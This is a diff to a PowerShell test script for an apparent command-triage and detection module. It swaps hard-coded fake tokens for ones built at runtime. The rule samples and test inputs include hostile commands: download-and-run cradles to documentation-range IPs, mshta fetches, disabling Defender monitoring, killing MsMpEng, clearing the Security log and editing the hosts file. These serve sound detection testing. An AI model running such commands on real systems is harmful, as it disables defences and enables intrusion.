@@ -6,6 +6,10 @@ Set-StrictMode -Off
 $repo = Split-Path -Parent $PSScriptRoot
 Import-Module (Join-Path $repo 'placebo.psd1') -Force
 
+# synthetic token shapes built at runtime (no real-looking literal sits in the tree)
+$tok = 'ghp_' + ('A' * 36)
+$aws = 'AKIA' + ('B' * 16)
+
 $script:pass = 0
 $script:fail = 0
 $script:failures = @()
@@ -30,7 +34,7 @@ $T += { Assert-Equal 'iex http://x' (Get-PlaceboNormalized -Text " [char]0x0456e
 $T += { Assert-Equal 'a e o p c x y i' ((Get-PlaceboNormalized -Text ([string][char]0x0430 + ' ' + [char]0x0435 + ' ' + [char]0x043E + ' ' + [char]0x0440 + ' ' + [char]0x0441 + ' ' + [char]0x0445 + ' ' + [char]0x0443 + ' ' + [char]0x0456)) -replace '\s+', ' ').Trim() -Name 'cyrillic homoglyphs mapped' }
 $T += { Assert-True (Test-PlaceboReadable -Text 'powershell -c iex http://x') -Name 'readable text passes' }
 $T += { Assert-True (-not (Test-PlaceboReadable -Text ([string][char]0x01 + [string][char]0x02 + [string][char]0x03))) -Name 'binary garbage rejected' }
-$T += { Assert-Equal 'ghp_AB**' ((Hide-PlaceboSecrets -Text 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234').Substring(0,8)) -Name 'github token masked' }
+$T += { Assert-Equal 'ghp_AA**' ((Hide-PlaceboSecrets -Text $tok).Substring(0,8)) -Name 'github token masked' }
 $T += { Assert-True ((Hide-PlaceboSecrets -Text 'sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAA-BBBBBBBBBBBB-AA') -notmatch 'sk-ant-api03-AAAAAAAA') -Name 'anthropic token masked' }
 $T += { Assert-True ((Hide-PlaceboUrl -Text 'http://198.51.100.4/a.ps1') -match '^hxxp://198\[.\]51\[.\]100\[.\]4/a\[.\]ps1$') -Name 'url defanged' }
 
@@ -94,7 +98,7 @@ $ruleSamples = @{
     'PF-031' = 'WScript.Shell CreateShortcut x.lnk -> powershell'; 'PF-032' = 'Set-MpPreference -DisableRealtimeMonitoring $true'
     'PF-033' = 'netsh advfirewall firewall add rule'; 'PF-034' = 'wevtutil cl Security'
     'PF-035' = '("{1}{0}" -f "b","a")'; 'PF-036' = 'I`EX something'
-    'PF-037' = '[Array]::Reverse($a)'; 'PF-038' = 'token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ12'
+    'PF-037' = '[Array]::Reverse($a)'; 'PF-038' = ('token ' + $tok)
     'PF-039' = 'Set-Clipboard -Value x'; 'PF-040' = 'Get-Clipboard'
     'PF-041' = 'cmd /c echo x'; 'PF-042' = 'explorer ms-settings:whofixes'
     'PF-043' = 'taskkill /f /im MsMpEng.exe'; 'PF-044' = 'echo x >> /etc/hosts'
@@ -138,8 +142,8 @@ $T += { Assert-True ($r.Score -ge 65) -Name 'enc sample score in critical band' 
 $T += { Assert-True ($r.Layers.Count -ge 1 -and $r.Layers[0].Kind -eq 'base64-utf16le') -Name 'layer trace recorded' }
 $T += { Assert-True (($r.Findings | Where-Object Id -eq 'PF-003').Count -eq 1) -Name 'webclient rule found in decoded layer' }
 $T += { Assert-True (@($r.Iocs.Urls) -contains 'http://198.51.100.23/stage2.ps1') -Name 'ioc from decoded layer' }
-$rMasked = Invoke-PlaceboTriage -Command "powershell -c 'iex http://x; echo ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456'"
-$T += { Assert-True (($rMasked.Command -match 'ghp_AB') -and ($rMasked.Command -notmatch 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ')) -Name 'token masked in report field' }
+$rMasked = Invoke-PlaceboTriage -Command ("powershell -c 'iex http://x; echo {0}'" -f $tok)
+$T += { Assert-True (($rMasked.Command -match 'ghp_AA') -and ($rMasked.Command -notmatch [regex]::Escape($tok))) -Name 'token masked in report field' }
 $rClean = Invoke-PlaceboTriage -Command 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 3'
 $T += { Assert-Equal 'clean' $rClean.Verdict -Name 'benign command stays clean' }
 $rPipe = 'mshta http://198.51.100.9/c.hta' | Invoke-PlaceboTriage
@@ -185,10 +189,10 @@ $T += { Assert-True ($hm -match '^# placebo hunt report') -Name 'markdown hunt s
 
 # ---------- masking deep check ----------
 $T += { Write-Output '== masking' }
-$rSec = Invoke-PlaceboTriage -Command "powershell -c iex http://198.51.100.1/a.ps1; echo 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456' 'AKIAIOSFODNN7EXAMPLE'"
+$rSec = Invoke-PlaceboTriage -Command ("powershell -c iex http://198.51.100.1/a.ps1; echo '{0}' '{1}'" -f $tok, $aws)
 $allJson = ConvertTo-PlaceboJson -Report $rSec
 $T += { Assert-True ($allJson -notmatch 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456') -Name 'no full github token in json' }
-$T += { Assert-True ($allJson -notmatch 'AKIAIOSFODNN7EXAMPLE') -Name 'no full aws key in json' }
+$T += { Assert-True ($allJson -notmatch [regex]::Escape($aws)) -Name 'no full aws key in json' }
 
 # ---------- run ----------
 Write-Output ''
